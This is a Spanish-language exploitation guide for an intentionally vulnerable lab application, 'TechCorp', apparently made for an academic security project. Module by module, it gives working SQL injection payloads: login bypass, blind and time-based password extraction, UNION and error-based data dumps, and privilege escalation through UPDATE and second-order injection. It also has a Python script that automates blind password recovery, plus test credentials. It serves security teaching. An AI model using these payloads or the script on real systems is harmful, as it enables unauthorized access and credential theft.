# Guía de Explotación - Sistema TechCorp

Esta es una aplicación de gestión empresarial **realista** con vulnerabilidades intencionales para fines educativos.

## Características de la Aplicación

### Modo Normal
- Se ve como un sistema corporativo real
- No muestra queries SQL ni información técnica
- Los resultados se presentan como en una aplicación de producción

### Modo Debug 🐛
- Actívalo con el botón flotante en la esquina inferior derecha
- Muestra las queries SQL ejecutadas
- Revela información sensible como contraseñas
- Útil para el proyecto académico

## Vulnerabilidades por Módulo

### 1. Login - Boolean-based Blind SQL Injection

**URL**: `/login`

**Escenario Real**: Sistema de autenticación de empleados

**Cómo se ve**: Login corporativo estándar con usuario y contraseña

**Vulnerabilidades que puedes explotar**:

**a) Bypass de autenticación**:
- Usuario: `admin'--`
- Contraseña: `cualquier cosa`
- **Resultado**: Acceso como admin sin conocer la contraseña

**b) Blind SQL Injection para extraer datos**:
- Usuario: `admin' AND LENGTH(password)>5--`
- Contraseña: `x`
- **Resultado**: Si login exitoso, la contraseña tiene más de 5 caracteres

**c) Extraer caracteres de la contraseña**:
- Usuario: `admin' AND SUBSTR(password,1,1)='a'--`
- Contraseña: `x`
- **Resultado**: Prueba cada letra para reconstruir la contraseña

**Modo Debug muestra**: La query SQL completa y la contraseña real en base de datos

---

### 2. Directorio de Empleados - UNION & Error-based Injection

**URL**: `/buscar_empleado`

**Escenario Real**: Búsqueda de empleados en el directorio corporativo

**Cómo se ve**: Dos pestañas - "Buscar por ID" y "Buscar por Nombre"

**Pestaña "Buscar por ID" - UNION-based**:

**a) Búsqueda normal**:
- ID: `1`
- **Resultado**: Muestra el empleado con ID 1

**b) Extraer contraseñas con UNION**:
- ID: `1 UNION SELECT id,username,password,email FROM users--`
- **Resultado**: Muestra las contraseñas en lugar del rol

**c) Obtener todos los usuarios**:
- ID: `-1 UNION SELECT id,username,password,email FROM users--`
- **Resultado**: Muestra todos los empleados con sus contraseñas

**d) Listar estructura de la base de datos**:
- ID: `1 UNION SELECT 1,name,sql,4 FROM sqlite_master WHERE type='table'--`
- **Resultado**: Revela todas las tablas y su estructura

**Pestaña "Buscar por Nombre" - Error-based**:

**a) Búsqueda normal**:
- Nombre: `admin`
- **Resultado**: Muestra empleados que contengan "admin"

**b) Forzar error para ver contraseñas**:
- Nombre: `admin' AND 1=CAST((SELECT password FROM users WHERE username='admin') AS INT)--`
- **Resultado**: El mensaje de error muestra la contraseña

**c) Extraer emails**:
- Nombre: `admin' AND 1=CAST((SELECT email FROM users LIMIT 1) AS INT)--`
- **Resultado**: El error revela emails

**Modo Debug muestra**: La query ejecutada y el tipo de búsqueda

---

### 3. Catálogo de Productos - Time-based Blind Injection

**URL**: `/productos`

**Escenario Real**: Búsqueda de productos por categoría

**Cómo se ve**: Selector de categorías (electronics, furniture, etc.)

**Vulnerabilidades**:

**a) Búsqueda normal**:
- Categoría: `electronics`
- **Resultado**: Muestra productos de electrónica

**b) Time-based injection (causa retraso)**:
- Categoría: `electronics' AND (SELECT COUNT(*) FROM users AS T1, users AS T2, users AS T3)>0--`
- **Resultado**: Respuesta más lenta, confirma la inyección

**c) Inferir longitud de contraseña**:
- Categoría: `electronics' AND (SELECT CASE WHEN LENGTH((SELECT password FROM users WHERE id=1))>5 THEN (SELECT COUNT(*) FROM users AS T1, users AS T2) ELSE 1 END)--`
- **Resultado**: Si tarda, la contraseña tiene más de 5 caracteres

**d) Extraer caracteres**:
- Categoría: `electronics' AND (SELECT CASE WHEN SUBSTR((SELECT password FROM users WHERE id=1),1,1)='a' THEN (SELECT COUNT(*) FROM users AS T1, users AS T2) ELSE 1 END)--`
- **Resultado**: Mide el tiempo para cada letra

**Modo Debug muestra**: La query SQL ejecutada

---

### 4. Mi Perfil - UPDATE SQL Injection

**URL**: `/perfil`

**Escenario Real**: Actualización de biografía del empleado

**Cómo se ve**: Formulario para actualizar información personal

**Vulnerabilidades**:

**a) Actualización normal**:
- User ID: `2`
- Bio: `Soy desarrollador senior`
- **Resultado**: Actualiza solo la biografía

**b) Escalar privilegios a admin**:
- User ID: `2`
- Bio: `hacked', role='admin`
- **Resultado**: El usuario 2 ahora es admin

**c) Cambiar contraseña y rol**:
- User ID: `2`
- Bio: `pwned', password='nuevapass', role='admin`
- **Resultado**: Modifica múltiples campos

**d) Modificar email**:
- User ID: `3`
- Bio: `test', email='hacker@evil.com', password='123`
- **Resultado**: Cambia email y contraseña

**Modo Debug muestra**: La query UPDATE completa y todos los campos del usuario actualizado

---

### 5. Registro de Empleado - Second-Order Injection

**URL**: `/registro`

**Escenario Real**: Alta de nuevos empleados en el sistema

**Cómo se ve**: Formulario de registro corporativo

**Vulnerabilidades**:

**a) Registro normal**:
- Usuario: `empleado5`
- Email: `emp5@techcorp.com`
- **Resultado**: Crea un nuevo empleado

**b) Inyección con comillas**:
- Usuario: `admin'--`
- Email: `hacker@test.com`
- **Resultado**: El payload se almacena y puede ejecutarse después

**c) Intentar modificar múltiples campos**:
- Usuario: `test', 'hacked@mail.com', 'pwned', 'admin')--`
- Email: `cualquiera@test.com`
- **Resultado**: Intenta cerrar el INSERT e insertar valores controlados

**d) Second-Order Attack**:
- Usuario: `hacker' OR '1'='1`
- Email: `test@test.com`
- **Resultado**: El payload se ejecuta en el SELECT posterior

**Modo Debug muestra**: Ambas queries (INSERT y SELECT), revelando cómo el payload se ejecuta en segundo orden

---

## Técnicas Avanzadas de Explotación

### Combinando Vulnerabilidades

**1. Reconocimiento → Ataque**:
1. Usa Error-based en `/buscar_empleado` para mapear la BD
2. Extrae contraseñas con UNION-based
3. Usa las credenciales en `/login`
4. Escala privilegios con UPDATE en `/perfil`

**2. Extracción Completa de Datos**:
```sql
# En búsqueda por ID:
-1 UNION SELECT id,username,password,email FROM users--
```

**3. Escalación de Privilegios**:
```sql
# En perfil, cambiar de user a admin:
Bio: hacked', role='admin', password='123456
```

### Automatización con Scripts

**Python para Blind SQL Injection**:
```python
import requests

url = "http://localhost:5000/login"
password = ""

for pos in range(1, 20):
    for char in "abcdefghijklmnopqrstuvwxyz0123456789":
        payload = f"admin' AND SUBSTR(password,{pos},1)='{char}'--"
        response = requests.post(url, data={
            "username": payload,
            "password": "x"
        })

        if "exitoso" in response.text:
            password += char
            print(f"Contraseña hasta ahora: {password}")
            break

print(f"Contraseña completa: {password}")
```

## Diferencias con una App Vulnerable Obvia

### Aplicación Tradicional de Tutorial:
- ❌ Muestra "VULNERABILIDAD: SQL Injection" en cada página
- ❌ Queries SQL visibles todo el tiempo
- ❌ Ejemplos de explotación en la interfaz
- ❌ Se ve claramente como una demo de seguridad

### Esta Aplicación (TechCorp):
- ✅ Se ve como un sistema empresarial real
- ✅ Queries SQL ocultas por defecto (activables con debug)
- ✅ Interfaz profesional y creíble
- ✅ Los resultados se muestran como en producción
- ✅ Mismos formularios para múltiples vulnerabilidades

## Usando el Modo Debug para el Proyecto

1. **Activa el Modo Debug**: Haz clic en el botón "🐛 Modo Debug" en cualquier página
2. **Realiza la explotación**: Ingresa el payload malicioso
3. **Captura pantallas**: El debug muestra la query SQL ejecutada
4. **Documenta el impacto**: Los resultados muestran datos extraídos o modificados

## Estructura del Proyecto Académico Sugerida

1. **Introducción**: Sistema de gestión empresarial vulnerable
2. **Metodología**: Cada módulo representa un tipo de inyección
3. **Explotación**: Screenshots del modo debug mostrando las queries
4. **Impacto**: Datos extraídos, accesos no autorizados, escalación de privilegios
5. **Mitigación**: Comparar con `app_segura.py`

## Usuarios de Prueba

```
admin:admin123 (role: admin)
user1:pass123 (role: user)
user2:mypassword (role: user)
testuser:test456 (role: user)
```

## Recordatorio

Esta aplicación es para **fines educativos únicamente**. Las vulnerabilidades son intencionales para demostrar técnicas de seguridad. Nunca uses estos conocimientos en sistemas reales sin autorización explícita.
